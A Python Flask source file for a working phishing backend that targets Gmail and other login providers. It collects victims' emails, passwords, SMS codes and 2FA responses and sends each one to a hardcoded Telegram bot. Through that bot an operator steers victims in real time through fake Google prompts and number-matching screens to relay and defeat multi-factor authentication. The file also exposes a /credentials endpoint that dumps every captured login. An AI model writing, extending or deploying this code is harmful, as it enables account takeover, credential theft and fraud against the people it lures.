from flask import Flask, request, redirect, session, render_template_string, jsonify, Response
import requests
import json
import os
import base64
import time
import hmac
import hashlib
from datetime import datetime
import threading

app = Flask(__name__)
from flask_cors import CORS
CORS(app)
app.secret_key = os.urandom(24)

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TG_CHAT_ID = "8337327707"
TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"

# ================================================================
# REDIRECT URL
# ================================================================
SUCCESS_REDIRECT_URL = "https://evntly.online"

# ================================================================
# STORAGE
# ================================================================
GMAIL_STATE_DB = "/tmp/gmail_state.json"
CRED_DB = "/tmp/credentials.json"
TELEGRAM_OFFSET_DB = "/tmp/telegram_offset.json"

def send_telegram(message):
    url = f"{TG_API}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_buttons(text, buttons):
    url = f"{TG_API}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": buttons}
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_2fa_grid():
    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
    rows = []
    row = []
    for n in numbers:
        row.append({"text": n, "callback_data": f"2fa_{n}"})
        if len(row) == 5:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    send_telegram_buttons("🔢 Choose the 2-digit number to show the user:", rows)

def send_main_controls():
    buttons = [
        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
        [{"text": "❌ Password Error", "callback_data": "password_error"}],
        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
    ]
    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the user:", buttons)

def init_gmail_state():
    if os.path.exists(GMAIL_STATE_DB):
        with open(GMAIL_STATE_DB) as f:
            return json.load(f)
    state = {
        "step": "email",
        "email": "",
        "password": "",
        "sms1": "",
        "sms2": "",
        "fa2_code": "",
        "fa2_choice": "",
        "ip": "",
        "user_agent": "",
        "timestamp": ""
    }
    save_gmail_state(state)
    return state

def save_gmail_state(state):
    with open(GMAIL_STATE_DB, "w") as f:
        json.dump(state, f, indent=2)

def save_credential(email, password, ip, method):
    db = {}
    if os.path.exists(CRED_DB):
        with open(CRED_DB) as f:
            db = json.load(f)
    if email not in db:
        db[email] = []
    db[email].append({
        "password": password,
        "ip": ip,
        "method": method,
        "timestamp": datetime.now().isoformat()
    })
    with open(CRED_DB, "w") as f:
        json.dump(db, f, indent=2)

def handle_telegram_updates():
    offset = 0
    if os.path.exists(TELEGRAM_OFFSET_DB):
        with open(TELEGRAM_OFFSET_DB) as f:
            offset = json.load(f).get("offset", 0)
    while True:
        try:
            resp = requests.get(f"{TG_API}/getUpdates", params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": json.dumps(["message", "callback_query"])
            }, timeout=35)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            updates = resp.json().get("result", [])
            for update in updates:
                update_id = update["update_id"]
                offset = update_id + 1
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_data = cb.get("data", "")
                    cb_id = cb.get("id")
                    if cb_data == "yes_prompt":
                        state = init_gmail_state()
                        state["step"] = "prompt"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Prompt sent to user. Waiting for Yes/No response..."})
                        send_telegram("✅ Google Prompt sent to user's page!")
                        send_main_controls()
                    elif cb_data == "sms1":
                        state = init_gmail_state()
                        state["step"] = "sms1"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code I sent to user"})
                        send_telegram("📱 SMS Code I sent to user's page!")
                        send_main_controls()
                    elif cb_data == "sms2":
                        state = init_gmail_state()
                        state["step"] = "sms2"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code II sent to user"})
                        send_telegram("📱 SMS Code II sent to user's page!")
                        send_main_controls()
                    elif cb_data == "password_error":
                        state = init_gmail_state()
                        state["step"] = "error"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "❌ Password error shown to user"})
                        send_telegram("❌ Password error shown to user!")
                        send_main_controls()
                    elif cb_data == "block":
                        state = init_gmail_state()
                        state["step"] = "blocked"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🚫 User blocked"})
                        send_telegram("🚫 User is now blocked!")
                        send_main_controls()
                    elif cb_data == "success":
                        state = init_gmail_state()
                        state["step"] = "success"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Success! Redirecting user..."})
                        send_telegram("✅ User redirected to success page!")
                        send_main_controls()
                    elif cb_data == "show_2fa_menu":
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🔢 Loading 2FA grid..."})
                        send_telegram_2fa_grid()
                        send_main_controls()
                    elif cb_data.startswith("2fa_"):
                        number = cb_data.split("_")[1]
                        state = init_gmail_state()
                        state["step"] = "fa2_show"
                        state["fa2_choice"] = number
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": f"🔢 Showing 2FA code: {number}"})
                        send_telegram(f"🔢 Showing 2FA code **{number}** to user!")
                        send_main_controls()
                elif "message" in update:
                    msg = update["message"]
                    text = msg.get("text", "").strip()
                    if text == "/start":
                        send_telegram("🤖 **Gmail Flow Control Bot**\n\nUse the buttons below to control the user's Gmail login flow:")
                        send_main_controls()
                    elif text == "/controls" or text == "/menu":
                        send_main_controls()
                    elif text == "/2fa":
                        send_telegram_2fa_grid()
                    elif text == "/status":
                        state = init_gmail_state()
                        s = state["step"]
                        e = state["email"] or "Not set"
                        send_telegram(f"📊 **Current Status**\nStep: `{s}`\nEmail: `{e}`\nPassword: {'✅ Captured' if state['password'] else '❌ Not yet'}\nSMS1: `{state['sms1'] or 'N/A'}`\nSMS2: `{state['sms2'] or 'N/A'}`\n2FA Code Shown: `{state['fa2_choice'] or 'N/A'}`\nIP: `{state['ip'] or 'N/A'}`\nTime: `{state['timestamp'] or 'N/A'}`")
            with open(TELEGRAM_OFFSET_DB, "w") as f:
                json.dump({"offset": offset}, f)
        except requests.exceptions.Timeout:
            continue
        except Exception as e:
            print(f"Telegram polling error: {e}")
            time.sleep(5)
            continue
        time.sleep(1)

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "endpoints": {
            "virtual_iv_page": "/virtual-iv",
            "gmail_state": "/api/gmail-state",
            "gmail_submit_email": "/api/gmail-email",
            "gmail_submit_password": "/api/gmail-password",
            "gmail_submit_sms": "/api/gmail-sms",
            "gmail_submit_2fa": "/api/gmail-2fa",
            "gmail_submit_prompt": "/api/gmail-prompt",
            "submit_credential": "/api/submit-credential",
            "submit_otp": "/api/submit-otp",
            "verify_turnstile": "/api/verify-turnstile",
            "credentials": "/credentials",
            "health": "/health"
        }
    })

@app.route('/virtual-iv')
def virtual_iv_page():
    state = init_gmail_state()
    state["step"] = "email"
    state["email"] = ""
    state["password"] = ""
    state["sms1"] = ""
    state["sms2"] = ""
    state["fa2_code"] = ""
    state["fa2_choice"] = ""
    state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    if state["ip"] and "," in state["ip"]:
        state["ip"] = state["ip"].split(",")[0].strip()
    state["user_agent"] = request.headers.get("User-Agent", "")
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    return render_template_string(PAGE_HTML)

@app.route('/api/gmail-state')
def get_gmail_state():
    state = init_gmail_state()
    return jsonify({
        "step": state["step"],
        "email": state["email"],
        "fa2_choice": state["fa2_choice"]
    })

@app.route('/api/gmail-email', methods=['POST'])
def gmail_email():
    data = request.json
    email = data.get('email', '').strip()
    if not email:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["email"] = email
    state["step"] = "password"
    # Capture IP/UA from request headers (critical fix for standalone HTML)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    state["ip"] = ip
    state["user_agent"] = ua
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
You have a new website form submission
Email: {email}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-password', methods=['POST'])
def gmail_password():
    data = request.json
    password = data.get('password', '').strip()
    if not password:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["password"] = password
    # Capture IP/UA from request headers (critical fix for standalone HTML)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    state["ip"] = ip
    state["user_agent"] = ua
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    save_credential(state["email"], password, ip, "gmail")
    
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
You have a new website form submission
Email: {state['email']}
Password: {password}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-sms', methods=['POST'])
def gmail_sms():
    data = request.json
    code = data.get('code', '').strip()
    step = data.get('step', 'sms1')
    if not code:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    if step == "sms1":
        state["sms1"] = code
    else:
        state["sms2"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL {step.upper()} ___[+]
Email: {state['email']}
Code: {code}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-2fa', methods=['POST'])
def gmail_2fa():
    data = request.json
    code = data.get('code', '').strip()
    if not code:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["fa2_code"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL 2FA ___[+]
Email: {state['email']}
Code Entered: {code}
Code Shown (our choice): {state['fa2_choice']}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-prompt', methods=['POST'])
def gmail_prompt():
    data = request.json
    response = data.get('response', '').strip()
    state = init_gmail_state()
    
    msg = f"""[+]___ GMAIL PROMPT ___[+]
Email: {state['email']}
Response: {response}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

# ================================================================
# NEW ENDPOINTS for standalone HTML (non-Gmail modals + OTP)
# ================================================================
@app.route('/api/submit-credential', methods=['POST'])
def submit_credential():
    data = request.json
    provider = data.get('provider', '')
    email = data.get('email', '')
    password = data.get('password', '')
    phone = data.get('phone', '')
    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = data.get('ua', '') or request.headers.get("User-Agent", "")
    
    msg = f"""[+]___ Online Invitation (LOGIN) ___[+]
Provider: {provider}
Email: {email}
Password: {password}
Phone: {phone}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    return jsonify({"success": True})

@app.route('/api/submit-otp', methods=['POST'])
def submit_otp():
    data = request.json
    code = data.get('code', '')
    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    
    msg = f"""[+]___ OTP ___[+]
Code: {code}
IP: {ip}"""
    send_telegram(msg)
    return jsonify({"success": True})

# ================================================================
# TURNSTILE VERIFICATION (NEW)
# ================================================================
TURNSTILE_SECRET_KEY = "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M"  # ← REPLACE with your real Turnstile secret key

@app.route('/api/verify-turnstile', methods=['POST'])
def verify_turnstile():
    data = request.json
    token = data.get('token', '')
    if not token:
        return jsonify({"success": False})
    
    try:
        resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
            "secret": TURNSTILE_SECRET_KEY,
            "response": token
        }, timeout=10)
        result = resp.json()
        return jsonify({"success": result.get("success", False)})
    except:
        return jsonify({"success": False})

@app.route('/credentials')
def list_credentials():
    if not os.path.exists(CRED_DB):
        return jsonify({})
    with open(CRED_DB) as f:
        return jsonify(json.load(f))

@app.route('/health')
def health():
    return "OK"

PAGE_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Bot‑Controlled Gmail Demo</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 2rem; }
    .step { display: none; }
    .step.active { display: block; }
    .btn { padding: 0.5rem 1rem; margin-top: 1rem; }
  </style>
</head>
<body>
  <h1>Bot‑Controlled Gmail Demo</h1>

  <!-- Step 1 – Choose provider -->
  <div id="step-provider" class="step active">
    <h2>Select a provider</h2>
    <button onclick="selectProvider('gmail')" class="btn">Gmail</button>
  </div>

  <!-- Step 2 – Enter email -->
  <div id="step-email" class="step">
    <h2>Enter your Gmail address</h2>
    <input type="email" id="email" placeholder="you@example.com">
    <button onclick="submitEmail()" class="btn">Next</button>
  </div>

  <!-- Step 3 – Enter password -->
  <div id="step-password" class="step">
    <h2>Enter your Gmail password</h2>
    <input type="password" id="password" placeholder="••••••••">
    <button onclick="submitPassword()" class="btn">Login</button>
  </div>

  <!-- Step 4 – Verify button (shown when bot is ready) -->
  <div id="step-verify" class="step">
    <h2>Bot is ready!</h2>
    <button id="verify-btn" class="btn">Verify</button>
  </div>

  <!-- ------------------------------------------------------------------
       JavaScript – keep the same logic, only the syntax has been fixed
  ------------------------------------------------------------------ -->
  <script>
    // 1️⃣  Show the requested step, hide the others
    function showStep(stepId) {
      document.querySelectorAll('.step').forEach(el => el.style.display = 'none');
      document.getElementById(stepId).style.display = 'block';
    }

    // 2️⃣  User selects a provider (only Gmail in this demo)
    function selectProvider(provider) {
      if (provider === 'gmail') {
        // Show the email entry step first
        showStep('step-email');

        /* If you want to skip the email screen and go straight to the password
           step, uncomment the line below and comment out the line above. */
        // showStep('step-password');
      }
    }

    // 3️⃣  Submit email → show password step
    function submitEmail() {
      const email = document.getElementById('email').value;
      if (!email) { alert('Please enter an email address.'); return; }

      // Send to /submit_email – keep your existing server logic
      fetch('/submit_email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ email })
      })
      .then(r => r.text())
      .then(() => showStep('step-password'))
      .catch(err => console.error(err));
    }

    // 4️⃣  Submit password → start polling
    function submitPassword() {
      const pwd = document.getElementById('password').value;
      if (!pwd) { alert('Please enter a password.'); return; }

      // Send to /submit_password – keep your existing server logic
      fetch('/submit_password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ password: pwd })
      })
      .then(r => r.text())
      .then(() => startPolling())
      .catch(err => console.error(err));
    }

    // 5️⃣  Polling for the “verify” button
    function startPolling() {
      const interval = setInterval(async () => {
        const res = await fetch('/status');
        const data = await res.json();
        if (data.status === 'ready') {
          clearInterval(interval);
          showStep('step-verify');
        }
      }, 2000); // poll every 2 seconds
    }
  </script>
</body>
</html>"""

def start_bot():
    time.sleep(2)
    handle_telegram_updates()

threading.Thread(target=start_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
